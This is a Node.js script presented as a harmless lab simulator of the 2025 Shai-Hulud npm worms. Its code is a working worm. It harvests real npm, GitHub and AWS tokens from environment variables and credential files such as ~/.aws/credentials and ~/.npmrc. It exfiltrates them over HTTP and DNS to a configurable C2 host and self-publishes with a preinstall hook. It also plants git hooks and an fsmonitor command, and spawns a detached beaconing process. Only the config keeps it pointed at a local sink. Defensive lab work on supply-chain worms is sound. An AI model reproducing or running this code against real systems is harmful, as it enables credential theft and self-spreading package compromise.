#!/usr/bin/env node
// HARMLESS worm simulator payload. Mimics the observable behaviour of the 2025 Shai-Hulud
// npm worms (CERT VU#534320; PostHog post-mortem 2025-11-26) without any real harm:
//   - it scans for FAKE canary tokens only (strings beginning CANARY-),
//   - it exfiltrates to a hardcoded LOCAL sink (C2 in c2.json), never a public host,
//   - it self-publishes to a LOCAL registry only.
// What it demonstrates is reachability, not damage: if a canary arrives at the sink, theft
// succeeded; if a bumped version lands in the local registry, propagation succeeded.
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const dgram = require('dgram');
const cp = require('child_process');

const C2 = require('./c2.json');
const HOST = C2.host;
const HTTP_PORT = C2.httpPort;
const DNS_PORT = C2.dnsPort;
const REGISTRY = C2.registry;
const MODE = process.argv[2] || 'standalone';
const BEHAVIORS = (process.env.WORM_BEHAVIORS || 'scan,exfil,publish,workspace,githook')
  .split(',').map((s) => s.trim()).filter(Boolean);
// npm exports INIT_CWD = the directory npm was invoked in (the project root). A real worm uses
// it to reach the checkout rather than its own node_modules subdirectory.
const WORKSPACE = process.env.INIT_CWD || process.cwd();

const report = { mode: MODE, behaviors: BEHAVIORS, steps: {} };
const has = (b) => BEHAVIORS.includes(b);

// TruffleHog-style patterns. The canary pattern is what the lab measures; the generic ones make
// the scanner realistic.
const PATTERNS = [
  /CANARY-[A-Z]+-[0-9a-f]{16}/g,
  /npm_[A-Za-z0-9]{36}/g,
  /ghp_[A-Za-z0-9]{36}/g,
  /AKIA[0-9A-Z]{16}/g,
];

function scanText(text, source, found) {
  for (const re of PATTERNS) {
    const m = text.match(re);
    if (m) for (const v of m) found.push({ source, value: v });
  }
}

function scanSecrets() {
  const found = [];
  for (const [k, v] of Object.entries(process.env)) {
    if (typeof v === 'string') scanText(`${k}=${v}`, `env:${k}`, found);
  }
  const home = os.homedir();
  const files = [
    path.join(home, '.npmrc'),
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.config', 'gh', 'hosts.yml'),
    path.join(home, '.git-credentials'),
    path.join(home, '.docker', 'config.json'),
    path.join(WORKSPACE, '.npmrc'),
    path.join(WORKSPACE, '.env'),
  ];
  for (const f of files) {
    try { scanText(fs.readFileSync(f, 'utf8'), `file:${f}`, found); } catch (_) {}
  }
  const seen = new Set();
  return found.filter((x) => (seen.has(x.value) ? false : seen.add(x.value)));
}

function exfilHttp(found) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({ mode: MODE, found });
    const req = http.request(
      { host: HOST, port: HTTP_PORT, path: '/steal', method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) } },
      (res) => { res.resume(); res.on('end', () => resolve({ ok: true, status: res.statusCode })); }
    );
    req.setTimeout(1500, () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
    req.on('error', (e) => resolve({ ok: false, error: e.code || String(e) }));
    req.end(payload);
  });
}

function dnsQuery(qname) {
  return new Promise((resolve) => {
    const sock = dgram.createSocket('udp4');
    const header = Buffer.from([0x13, 0x37, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0]);
    const parts = [];
    for (const label of qname.split('.')) {
      const b = Buffer.from(label, 'latin1');
      parts.push(Buffer.from([b.length]), b);
    }
    parts.push(Buffer.from([0, 0, 1, 0, 1])); // root label, QTYPE A, QCLASS IN
    const msg = Buffer.concat([header, ...parts]);
    let done = false;
    const finish = (r) => { if (!done) { done = true; try { sock.close(); } catch (_) {} resolve(r); } };
    sock.on('error', (e) => finish({ ok: false, error: e.code || String(e) }));
    sock.send(msg, DNS_PORT, HOST, (e) => {
      if (e) return finish({ ok: false, error: e.code || String(e) });
      setTimeout(() => finish({ ok: true }), 300);
    });
  });
}

async function exfilDns(found) {
  const results = [];
  for (const { value } of found) results.push(await dnsQuery(`${value}.exfil.test`));
  return results;
}

function selfPublish() {
  // Build a fresh malicious version in a temp dir and publish it, the way the worm spread.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'worm-pub-'));
  const version = `99.0.${Date.now()}${MODE === 'postinstall' ? '1' : '0'}`;
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
    name: '@wormlab/worm-sim', version, scripts: { preinstall: 'node payload.js preinstall' },
    files: ['payload.js', 'c2.json'],
  }, null, 2));
  fs.copyFileSync(path.join(__dirname, 'payload.js'), path.join(dir, 'payload.js'));
  fs.copyFileSync(path.join(__dirname, 'c2.json'), path.join(dir, 'c2.json'));
  const r = cp.spawnSync('npm', ['publish', '--registry', REGISTRY], {
    cwd: dir, encoding: 'utf8', timeout: 20000, stdio: ['ignore', 'pipe', 'pipe'],
  });
  return { version, code: r.status, published: r.status === 0, stderr: (r.stderr || '').slice(-400) };
}

function writeWorkspace() {
  try {
    fs.writeFileSync(path.join(WORKSPACE, 'WORM_WAS_HERE.txt'), `owned by ${MODE}\n`);
    return { workspaceFile: true };
  } catch (e) { return { workspaceFile: false, err: e.code }; }
}

function writeGitHook() {
  try {
    const hooks = path.join(WORKSPACE, '.git', 'hooks');
    fs.mkdirSync(hooks, { recursive: true });
    const hook = path.join(hooks, 'pre-commit');
    // A real worm would re-run its payload here; the lab hook only leaves a marker.
    fs.writeFileSync(hook, `#!/bin/sh\ntouch "${WORKSPACE}/HOOK_RAN"\n`);
    fs.chmodSync(hook, 0o755);
    return { gitHook: true };
  } catch (e) { return { gitHook: false, err: e.code }; }
}

function writeGitConfig() {
  // core.fsmonitor in a repository's config is a command git runs on `git status`, so a later CI
  // step that merely inspects the checkout executes it. The lab command only leaves a marker.
  try {
    fs.appendFileSync(path.join(WORKSPACE, '.git', 'config'),
      `[core]\n\tfsmonitor = "touch '${WORKSPACE}/FSMONITOR_RAN'; false"\n`);
    return { gitConfig: true };
  } catch (e) { return { gitConfig: false, err: e.code }; }
}

function escapeWorkspace() {
  const target = path.join(WORKSPACE, '..', 'WORM_ESCAPE.txt');
  try { fs.writeFileSync(target, 'escaped\n'); return { escaped: true }; }
  catch (e) { return { escaped: false, err: e.code }; }
}

function detach() {
  // Fork a detached background process that keeps trying to exfiltrate after the install exits
  // (the Shai-Hulud 2.0 behaviour). Lives for ~15 s.
  const script = path.join(os.tmpdir(), `worm-bg-${process.pid}.cjs`);
  fs.writeFileSync(script, `
    const http=require('http');
    let n=0;
    const t=setInterval(()=>{
      n++;
      const body=JSON.stringify({bg:true,tick:n});
      const req=http.request({host:${JSON.stringify(HOST)},port:${HTTP_PORT},path:'/bg',method:'POST',headers:{'content-length':Buffer.byteLength(body)}},r=>r.resume());
      req.on('error',()=>{});req.setTimeout(900,()=>req.destroy());req.end(body);
      if(n>=15){clearInterval(t);process.exit(0);}
    },1000);
  `);
  const child = cp.spawn(process.execPath, [script], { detached: true, stdio: 'ignore' });
  child.unref();
  return { pid: child.pid };
}

async function main() {
  let found = [];
  if (has('scan')) { found = scanSecrets(); report.steps.scan = { count: found.length, values: found }; }
  if (has('exfil')) {
    report.steps.exfilHttp = await exfilHttp(found);
    report.steps.exfilDns = await exfilDns(found);
  }
  if (has('publish')) report.steps.publish = selfPublish();
  if (has('workspace')) report.steps.workspace = writeWorkspace();
  if (has('githook')) report.steps.githook = writeGitHook();
  if (has('gitconfig')) report.steps.gitconfig = writeGitConfig();
  if (has('escape')) report.steps.escape = escapeWorkspace();
  if (has('detach')) report.steps.detach = detach();
  if (process.env.WORM_REPORT) {
    try { fs.appendFileSync(process.env.WORM_REPORT, JSON.stringify(report) + '\n'); } catch (_) {}
  }
}

main().catch(() => {});
